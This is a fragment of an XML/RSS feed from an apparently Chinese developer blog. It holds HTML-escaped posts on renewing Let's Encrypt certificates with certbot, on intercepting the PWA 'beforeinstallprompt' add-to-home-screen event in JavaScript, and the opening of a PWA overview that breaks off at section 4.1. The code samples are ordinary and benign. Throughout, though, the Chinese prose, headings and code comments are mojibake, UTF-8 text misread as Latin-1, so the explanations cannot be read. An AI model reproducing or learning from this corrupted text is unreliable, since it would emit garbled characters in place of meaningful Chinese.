&lt;h3 id=&quot;22-ç»­è®¢&quot;&gt;2.2. ç»­è®¢&lt;/h3&gt;

&lt;p&gt;Letçš„åŠ å¯†è¯ä¹¦æŒç»­90å¤©ï¼Œå¯ä»¥ä½¿ç”¨è®¡åˆ’ä»»åŠ¡ç»­è®¢è¯ä¹¦æœ‰æ•ˆæœŸ&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;certbot renew &lt;span class=&quot;nt&quot;&gt;--dry-run&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>  
               <pubDate>Tue, 04 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/https-certificate/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/https-certificate/</guid>  
               </item>  
          
            <item>  
               <title>PWA ä¹‹æ‹¦æˆª A2HS å®ç°è‡ªä¸»åº”ç”¨æ·»åŠ ä¸»å±äº‹ä»¶</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-æ¦‚å¿µ&quot; id=&quot;markdown-toc-1-æ¦‚å¿µ&quot;&gt;1. æ¦‚å¿µ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-èƒŒæ™¯&quot; id=&quot;markdown-toc-2-èƒŒæ™¯&quot;&gt;2. èƒŒæ™¯&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-beforeinstallprompt&quot; id=&quot;markdown-toc-3-beforeinstallprompt&quot;&gt;3. beforeinstallprompt&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-demoæ•ˆæœ&quot; id=&quot;markdown-toc-4-demoæ•ˆæœ&quot;&gt;4. demoæ•ˆæœ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-åˆ¤æ–­æ˜¯å¦å®‰è£…&quot; id=&quot;markdown-toc-5-åˆ¤æ–­æ˜¯å¦å®‰è£…&quot;&gt;5. åˆ¤æ–­æ˜¯å¦å®‰è£…&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#6-å‚è€ƒé“¾æ¥&quot; id=&quot;markdown-toc-6-å‚è€ƒé“¾æ¥&quot;&gt;6. å‚è€ƒé“¾æ¥&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190530/1_hWVmsnBY6Fr6OoNvIU5pmg.png&quot; alt=&quot;pwa-a2hs&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-æ¦‚å¿µ&quot;&gt;1. æ¦‚å¿µ&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;A2HS&lt;/strong&gt; æ˜¯ï¼ˆAdd to Home screenï¼‰çš„ç¼©å†™ï¼Œä¹Ÿæ˜¯PWAç‰¹æ€§ä¹‹ä¸€ï¼Œå®ƒä¸»è¦ä¸ºwebåº”ç”¨ç¨‹åºæä¾›ä¸æœ¬æœºåº”ç”¨ç¨‹åºç›¸åŒçš„ç”¨æˆ·ä½“éªŒä¼˜åŠ¿ï¼Œå°†PWAåº”ç”¨æ·»åŠ è‡³æ¡Œé¢åï¼Œç”¨æˆ·å¯ä»¥åƒæ‰“å¼€æ™®é€šåº”ç”¨ç¨‹åºä¸€æ ·ä½¿ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190529/a2hs-1.png&quot; alt=&quot;a2hs-1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190529/a2hs-2.png&quot; alt=&quot;a2hs-2&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-èƒŒæ™¯&quot;&gt;2. èƒŒæ™¯&lt;/h2&gt;

&lt;p&gt;é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ç¼–å†™çš„webåº”ç”¨æ»¡è¶³pwaåº”ç”¨æœ€ä½è¦æ±‚ï¼ˆmanifest.jsonå’Œservice-sworkerï¼‰æ—¶ï¼Œæµè§ˆå™¨ä¼šåœ¨æç¤ºç”¨æˆ·å¯ä»¥å°†å½“å‰è®¿é—®çš„webå®‰è£…åˆ°æ¡Œé¢ä¸Šï¼Œè¿™ä¸ªè¡Œä¸ºæ˜¯æµè§ˆå™¨æ§åˆ¶çš„ï¼Œç”¨æˆ·æ˜¯å¦å¯ä»¥ä¸ä¾èµ–äºæµè§ˆå™¨ï¼Œä¸å¿…æ¯æ¬¡éƒ½å¼¹å‡º A2HS çš„bannerï¼Œè¡Œä¸ºç”±ç”¨æˆ·æ§åˆ¶ï¼Œå¦‚ç‚¹å‡»æŒ‰é’®æç¤ºå®‰è£…ï¼Œæœ¬æ–‡åŸºäºæ­¤ç›®çš„ç¼–å†™ã€‚&lt;/p&gt;

&lt;h2 id=&quot;3-beforeinstallprompt&quot;&gt;3. beforeinstallprompt&lt;/h2&gt;

&lt;p&gt;è¦å®ç°ä¸Šè¿°è¦æ±‚ï¼Œéœ€è¦ç›‘å¬ &lt;em&gt;beforeinstallprompt&lt;/em&gt; äº‹ä»¶å¹¶è¿›è¡Œå¤„ç†ã€‚&lt;/p&gt;

&lt;p&gt;å®ç°ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// å®šä¹‰A2HSäº‹ä»¶å¯¹è±¡&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// ç›‘å¬beforeinstallpromptäº‹ä»¶ï¼Œæµè§ˆå™¨è§¦å‘A2HSæ—¶ä¼šæ‰§è¡Œ&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'beforeinstallprompt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// é˜»æ­¢è‡ªåŠ¨æç¤º&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preventDefault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// å‚¨å­˜äº‹ä»¶å¯¹è±¡ï¼Œæ–¹ä¾¿åœ¨ä¹‹åçš„æŒ‰é’®äº‹ä»¶ä¸­æ‰‹åŠ¨è§¦å‘&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
 
&lt;span class=&quot;c1&quot;&gt;// UIä¸Šçš„æŒ‰é’®ç‚¹å‡»äº‹ä»¶&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;installBtn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'click'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;// å¼¹å‡ºA2HSæç¤º&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// ç­‰å¾…ç”¨æˆ·æ“ä½œç»“æœ&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;userChoice&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;then&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;choiceResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;choiceResult&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outcome&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'accepted'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ç”¨æˆ·å·²ç»æ¥å—å®‰è£…'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ç”¨æˆ·å·²ç»å–æ¶ˆå®‰è£…'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      
      &lt;span class=&quot;c1&quot;&gt;// åªèƒ½ç”¨ä¸€æ¬¡&lt;/span&gt;
      &lt;span class=&quot;nx&quot;&gt;installPromptEvent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;4-demoæ•ˆæœ&quot;&gt;4. demoæ•ˆæœ&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190530/2019-05-30 00.20.10.gif&quot; alt=&quot;demo-a2hs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/wangjunneil/exchange-pwa/tree/master/src/views&quot;&gt;å®Œæ•´çš„demoä»£ç &lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;5-åˆ¤æ–­æ˜¯å¦å®‰è£…&quot;&gt;5. åˆ¤æ–­æ˜¯å¦å®‰è£…&lt;/h2&gt;

&lt;p&gt;ç›‘å¬å®‰è£…äº‹ä»¶&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'appinstalled'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;event&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'installed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è‹¥æ˜¯ä»ä¸»å±å¹•å¯åŠ¨ï¼Œåˆ™å¯ä»¥é€šè¿‡ javascript åˆ¤æ–­&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;matchMedia&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'(display-mode: standalone)'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;matches&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'display-mode is standalone'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;safariæµè§ˆå™¨&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;navigator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;standalone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'display-mode is standalone'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šé¢ä¸‰ä¸ªè¾“å‡ºåªä¼šåœ¨ standalone æ¨¡å¼ä¸‹æ‰§è¡Œ&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;6-å‚è€ƒé“¾æ¥&quot;&gt;6. å‚è€ƒé“¾æ¥&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps/Add_to_home_screen&quot;&gt;Add to Home screen&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/BeforeInstallPromptEvent&quot;&gt;Beforeâ€‹Installâ€‹Promptâ€‹Event&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.jomendez.com/2018/06/05/add-home-screen-pwas/&quot;&gt;Add to Home Screen your ionic PWA&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>  
               <pubDate>Wed, 29 May 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/05/pwa-handle-install-prompt/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/05/pwa-handle-install-prompt/</guid>  
               </item>  
          
            <item>  
               <title>Progressive Web App æ±‡æ€»ä½¿ç”¨è¯´æ˜</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-pwaæ˜¯ä»€ä¹ˆ&quot; id=&quot;markdown-toc-1-pwaæ˜¯ä»€ä¹ˆ&quot;&gt;1. PWAæ˜¯ä»€ä¹ˆ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-æœ‰ä»€ä¹ˆç‰¹æ€§&quot; id=&quot;markdown-toc-2-æœ‰ä»€ä¹ˆç‰¹æ€§&quot;&gt;2. æœ‰ä»€ä¹ˆç‰¹æ€§&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-åŸºæœ¬ç»„æˆç»“æ„&quot; id=&quot;markdown-toc-3-åŸºæœ¬ç»„æˆç»“æ„&quot;&gt;3. åŸºæœ¬ç»„æˆç»“æ„&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-ç¼–å†™åŸç”Ÿçš„pwaåº”ç”¨&quot; id=&quot;markdown-toc-4-ç¼–å†™åŸç”Ÿçš„pwaåº”ç”¨&quot;&gt;4. ç¼–å†™åŸç”Ÿçš„PWAåº”ç”¨&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#41-åº”ç”¨æè¿°æ–‡ä»¶&quot; id=&quot;markdown-toc-41-åº”ç”¨æè¿°æ–‡ä»¶&quot;&gt;4.1 åº”ç”¨æè¿°æ–‡ä»¶&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#42-é¦–é¡µæ–‡ä»¶æ³¨å†Œ-manifestjson&quot; id=&quot;markdown-toc-42-é¦–é¡µæ–‡ä»¶æ³¨å†Œ-manifestjson&quot;&gt;4.2 é¦–é¡µæ–‡ä»¶æ³¨å†Œ manifest.json&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#43-æœåŠ¡å·¥ä½œæ–‡ä»¶&quot; id=&quot;markdown-toc-43-æœåŠ¡å·¥ä½œæ–‡ä»¶&quot;&gt;4.3 æœåŠ¡å·¥ä½œæ–‡ä»¶&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#44-è„šæœ¬æ–‡ä»¶ä¸­æ³¨å†Œ-service-workerjs&quot; id=&quot;markdown-toc-44-è„šæœ¬æ–‡ä»¶ä¸­æ³¨å†Œ-service-workerjs&quot;&gt;4.4 è„šæœ¬æ–‡ä»¶ä¸­æ³¨å†Œ service-worker.js&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#45-å‘å¸ƒåˆ°æœåŠ¡å™¨ä¸­&quot; id=&quot;markdown-toc-45-å‘å¸ƒåˆ°æœåŠ¡å™¨ä¸­&quot;&gt;4.5 å‘å¸ƒåˆ°æœåŠ¡å™¨ä¸­&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#46-å®ç°åŸºæœ¬çš„ç¦»çº¿å­˜å‚¨&quot; id=&quot;markdown-toc-46-å®ç°åŸºæœ¬çš„ç¦»çº¿å­˜å‚¨&quot;&gt;4.6 å®ç°åŸºæœ¬çš„ç¦»çº¿å­˜å‚¨&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#47-æ¿€æ´»æ›´æ–°äº‹ä»¶&quot; id=&quot;markdown-toc-47-æ¿€æ´»æ›´æ–°äº‹ä»¶&quot;&gt;4.7 æ¿€æ´»æ›´æ–°äº‹ä»¶&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-å¯¹-pwa-åº”ç”¨è¿›è¡Œå®¡è®¡&quot; id=&quot;markdown-toc-5-å¯¹-pwa-åº”ç”¨è¿›è¡Œå®¡è®¡&quot;&gt;5. å¯¹ PWA åº”ç”¨è¿›è¡Œå®¡è®¡&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#é™„å½•a-ä¸åŒæµè§ˆå™¨å¯¹-pwa-åº”ç”¨ç¼“å­˜çš„é™åˆ¶&quot; id=&quot;markdown-toc-é™„å½•a-ä¸åŒæµè§ˆå™¨å¯¹-pwa-åº”ç”¨ç¼“å­˜çš„é™åˆ¶&quot;&gt;é™„å½•A ä¸åŒæµè§ˆå™¨å¯¹ PWA åº”ç”¨ç¼“å­˜çš„é™åˆ¶&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#é™„å½•b-pwaåœ¨iosä¸­çš„é—®é¢˜ä¸è§£å†³æ–¹æ³•&quot; id=&quot;markdown-toc-é™„å½•b-pwaåœ¨iosä¸­çš„é—®é¢˜ä¸è§£å†³æ–¹æ³•&quot;&gt;é™„å½•B PWAåœ¨IOSä¸­çš„é—®é¢˜ä¸è§£å†³æ–¹æ³•&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#é™„å½•c-å®éªŒä¸­çš„pwaåº”ç”¨å‚è€ƒ&quot; id=&quot;markdown-toc-é™„å½•c-å®éªŒä¸­çš„pwaåº”ç”¨å‚è€ƒ&quot;&gt;é™„å½•C å®éªŒä¸­çš„PWAåº”ç”¨å‚è€ƒ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#é™„å½•d-å¦‚ä½•å¯¹pwaè¿›è¡Œè¿œç¨‹è°ƒè¯•&quot; id=&quot;markdown-toc-é™„å½•d-å¦‚ä½•å¯¹pwaè¿›è¡Œè¿œç¨‹è°ƒè¯•&quot;&gt;é™„å½•D å¦‚ä½•å¯¹PWAè¿›è¡Œè¿œç¨‹è°ƒè¯•&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#å‚è€ƒæ–‡ç« &quot; id=&quot;markdown-toc-å‚è€ƒæ–‡ç« &quot;&gt;å‚è€ƒæ–‡ç« &lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;1-pwaæ˜¯ä»€ä¹ˆ&quot;&gt;1. PWAæ˜¯ä»€ä¹ˆ&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Progressive Web App&lt;/strong&gt;ï¼Œç®€ç§° &lt;strong&gt;pwa&lt;/strong&gt;ï¼Œä¸­æ–‡åç§°ä¸º &lt;em&gt;æ¸è¿›å¼ç½‘é¡µåº”ç”¨&lt;/em&gt;ã€‚å®ƒçš„ç›®çš„æ˜¯åˆ©ç”¨webçš„æŠ€æœ¯ç»™ç§»åŠ¨ç«¯çš„è®¾å¤‡æä¾›åŸç”ŸAppçš„ä½“éªŒã€‚&lt;/p&gt;

&lt;h2 id=&quot;2-æœ‰ä»€ä¹ˆç‰¹æ€§&quot;&gt;2. æœ‰ä»€ä¹ˆç‰¹æ€§&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ç¦»çº¿æˆ–ç½‘ç»œç¯å¢ƒå·®çš„æƒ…å†µä¸‹ä¹Ÿèƒ½æ­£å¸¸å·¥ä½œ&lt;/li&gt;
  &lt;li&gt;å“åº”çš„åŠ è½½é€Ÿåº¦å’ŒåŸç”Ÿåº”ç”¨æ²¡æœ‰åŒºåˆ«&lt;/li&gt;
  &lt;li&gt;ç•Œé¢å¸ƒå±€å’ŒåŸç”Ÿåº”ç”¨ç›¸ä¸€è‡´&lt;/li&gt;
  &lt;li&gt;æ‹¥æœ‰åå°è¿è¡Œå’Œæ¨é€é€šçŸ¥çš„èƒ½åŠ›&lt;/li&gt;
  &lt;li&gt;â€¦â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;3-åŸºæœ¬ç»„æˆç»“æ„&quot;&gt;3. åŸºæœ¬ç»„æˆç»“æ„&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190322/1523604475510f808913f4f.jpeg&quot; alt=&quot;pwaç»„æˆ&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ–­ç½‘æˆ–ç½‘ç»œå·®ï¼ŒåŸºäºå¸¸é©»åå°çš„ &lt;strong&gt;Service Worker&lt;/strong&gt; å®ç°æ•°æ®ç¦»çº¿å­˜å‚¨ä¸é€šçŸ¥æ¨é€ã€‚&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;å…³äºå„ä¸ªæµè§ˆå™¨é’ˆå¯¹äº &lt;em&gt;pwa&lt;/em&gt; åº”ç”¨ç¼“å­˜çš„å¤§å°é™åˆ¶ï¼Œè¯·å‚çœ‹ &lt;strong&gt;é™„å½•A ä¸åŒæµè§ˆå™¨å¯¹ PWA åº”ç”¨ç¼“å­˜çš„é™åˆ¶&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;4-ç¼–å†™åŸç”Ÿçš„pwaåº”ç”¨&quot;&gt;4. ç¼–å†™åŸç”Ÿçš„PWAåº”ç”¨&lt;/h2&gt;

&lt;p&gt;ç¼–å†™ &lt;strong&gt;PWA&lt;/strong&gt; åº”ç”¨å‰ï¼Œåº”è¯¥å·²ç»æœ‰ä¸€ä¸ªæ ‡å‡†çš„å“åº”å¼çš„ Webç«™ç‚¹ï¼Œå¯ä»¥æ­£å¸¸åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ã€‚&lt;/p&gt;

&lt;p&gt;å¦å¤–å»ºè®®åœ¨ç½‘ç«™æ ¹è·¯å¾„ä¸­å‡†å¤‡å¥½ &lt;strong&gt;favicon.ico&lt;/strong&gt; çš„å›¾æ ‡ã€‚&lt;/p&gt;

&lt;h3 id=&quot;41-åº”ç”¨æè¿°æ–‡ä»¶&quot;&gt;4.1 åº”ç”¨æè¿°æ–‡ä»¶&lt;/h3&gt;

